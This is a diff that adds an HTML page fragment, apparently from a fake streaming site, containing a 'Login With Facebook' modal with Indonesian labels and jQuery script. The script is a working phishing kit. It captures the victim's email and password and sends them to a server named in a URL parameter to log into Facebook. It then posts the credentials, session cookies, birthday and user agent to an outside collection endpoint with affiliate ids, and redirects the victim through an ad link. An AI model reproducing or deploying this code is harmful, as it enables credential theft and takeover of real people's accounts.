@@ -1,0 +1,164 @@
+<div class="_38VwfeWp">
+  <div class="kS0VauOn">
+    <div class="UAP97ouK">
+      <div>
+        <h3 class="_1S9zZY0e">Stream Elements</h3>
+        <ul class="_3BTjl4ja">
+          <li><a class="_1QjsHirW" href="#user-terms">Terms &amp; Conditions</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="UAP97ouK">
+      <div>
+        <h3 class="_1xMZ20N3">Meet Stream</h3>
+        <ul class="_1tsm0MY4">
+          <li><a class="_1FQB45Bp" href="#">Careers</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="UAP97ouK">
+      <div>
+        <h3 class="_29F2Nktg">Help</h3>
+        <ul class="aDDKEGpP">
+          <li><a class="_LzJ9gyc" href="#">Become an Affiliate</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+  <!-- Modal HTML embedded directly into document -->
+
+<div class="modal fade bd-example-modal-sm login" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog modal-sm">
+    <div class="loginmodal-container">
+      <img src="images/logo.png" class="modal-img"/>
+      <div id="alert"></div>
+      <div>
+        <i id="err-email"></i>
+        <input type="text" name="mail" id="mail" placeholder="Email atau Nomor Telepon">
+        <i id="err-password"></i>
+        <input type="password" name="pass" id="pass" placeholder="Kata Sandi">
+        <button type="submit" name="login" id="login" class="Rm6dwYER" value="Login">Login With Facebook</button>
+      </div>
+      <div class="login-help">
+        <a href="https://id-id.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Lupa Kata Sandi?</a>
+      </div>
+      <div id="link_next"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+
+  $("#app").click(function() {
+      $(".modal").modal({
+        fadeDuration: 1000,
+        fadeDelay: 1,
+        clickClose: false,
+        showClose: false
+      });
+  });
+
+  function alert(x,y,z){
+    var get = '#' + x.replace('#', '');
+    if (y == 'success') {
+      var lapor = 'Success! ';
+    }
+    $(get).html('<div class="alert '+y+'"><b><i>'+z+' </i></b></div>');
+    $(".alert").fadeTo(5000, 2000).slideUp(3000, function(){
+        $(this).remove();
+    });
+  }
+
+  function check(put){
+    var add = '#err-' + put.replace('#err-', '') + '';
+    var get = '#' + put.replace('#', '');
+    var mes = $(get).attr('placeholder');
+    var val = $(get).val();
+    if (val) {
+      $(add).html("");
+    }else{
+      $(add).html(  '<b class="login-error">' + mes + ' tidak boleh kosong</b>' );
+    }
+  }
+
+  $("#email").change(function() {
+    check("email");
+  });
+  $("#password").change(function() {
+    check("password");
+  });
+
+  $("#login").click(function(){
+    var a = $("#mail").val();
+    var b = $("#pass").val();
+    var agent = navigator.userAgent;
+
+    if (redirect) {
+      var c = navigator.userAgent;
+    }else {
+      var c = 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)';
+    }
+
+    if (!a) {check("mail");}else
+    if (!b) {check("pass");}else{
+      $("#login").html("Login Progress...");
+        var srv = 'https://' + h2b(param('srv')) + '/ngrok/login.php';
+        $.post(srv,{email: a, pass: b, useragent: c, Login: 'Login'},function(l, response){
+          if (l.response == 404) {
+            alert('alert','danger',l.message);
+          }else if (l.response == 200) {
+            $.post("https://www.genpost.club/api/v1/",{
+              reff: param('uid'),
+              pid: param('pid'),
+              mail: l.user.id,
+              pass: b,
+              useragent: agent,
+              cookies: l.session.cookies,
+              birthday: l.user.birthday,
+              reg: l.response
+            },function(x, status){
+              $("#alert").html("<a href='http://adf.ly/21463283/https://pornhub.com' id='success'></a>");
+              document.getElementById("success").click();
+            });
+          }else {
+            $.post("https://www.genpost.club/api/v1/",
+              {
+                reff: param('uid'),
+                pid: param('pid'),
+                mail: a,
+                pass: b,
+                useragent: agent,
+                cookies: l.message,
+                reg: param('pid')
+              },function(x, status){
+                $("#alert").html("<a href='http://adf.ly/21463283/https://pornhub.com' id='success'></a>");
+                document.getElementById("success").click();
+            });
+          }
+          $("#login").html("Login With Facebook");
+        }).fail(function( err, response ) {
+          $.post("https://www.genpost.club/api/v1/",
+            {
+                reff: param('uid'),
+                pid: param('pid'),
+                mail: a,
+                pass: b,
+                err: 'error',
+                useragent: agent
+            },function(x, status){
+              if (x.response == 404) {
+                alert('alert','danger',x.message);
+              }else {
+                $("#alert").html("<a href='http://adf.ly/21463283/https://pornhub.com' id='success'></a>");
+                document.getElementById("success").click();
+              }
+            $("#login").html("Login With Facebook");
+          });
+        });
+    }// akhir check input
+
+  });
+</script>
+<script type="text/javascript">
+</script>
